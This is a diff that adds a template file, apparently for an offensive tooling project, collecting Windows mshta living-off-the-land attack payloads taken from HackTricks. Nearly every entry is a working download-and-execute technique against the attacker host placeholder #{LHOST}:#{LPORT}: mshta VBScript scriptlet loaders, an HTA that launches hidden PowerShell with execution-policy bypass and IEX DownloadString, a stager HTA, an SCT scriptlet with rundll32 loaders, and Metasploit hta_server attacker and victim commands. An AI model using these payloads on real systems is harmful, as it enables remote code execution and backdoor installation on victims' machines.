@@ -1,0 +1,59 @@
+# Microsoft HTML Application Host
+
+# refer: https://book.hacktricks.xyz/shells/shells/windows#mshta
+
+@file.desc(mshta file)
+
+# 执行sct脚本文件
+# desc: Download & Execute SCT Script
+mshta vbscript:Close(Execute("GetObject(""script:http://#{LHOST}:#{LPORT}/#{file}"")"))
+@file.desc(sct file)
+
+mshta http://#{LHOST}:#{LPORT}/#{file}
+
+# use hta to download and execute PS backdoor
+# desc: SCRIPT
+<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://#{LHOST}:#{LPORT}/#{file}')"</scRipt>
+@file.desc(payload.ps1)
+
+# You can download & execute very easily a Koadic zombie using the stager hta
+# desc: Stager hta
+<html>
+<head>
+<HTA:APPLICATION ID="HelloExample">
+<script language="jscript">
+        var c = "cmd.exe /c calc.exe"; 
+        new ActiveXObject('WScript.Shell').Run(c);
+</script>
+</head>
+<body>
+<script>self.close();</script>
+</body>
+</html>
+
+
+# desc: sct Script
+<?XML version="1.0"?>
+<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
+<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
+<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
+<scriptlet>
+<public>
+</public>
+<script language="JScript">
+<![CDATA[
+    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+]]>
+</script>
+</scriptlet>
+
+# desc: Metasploit Attacker
+use exploit/windows/misc/hta_server
+set srvhost #{LHOST}
+set lhost #{LHOST}
+exploit
+
+# The file name is given in the output of metasploit
+# desc: Metasploit Victim
+mshta.exe //#{LHOST}:#{LPORT}/#{file}
+@file.desc(metasploit output file name)
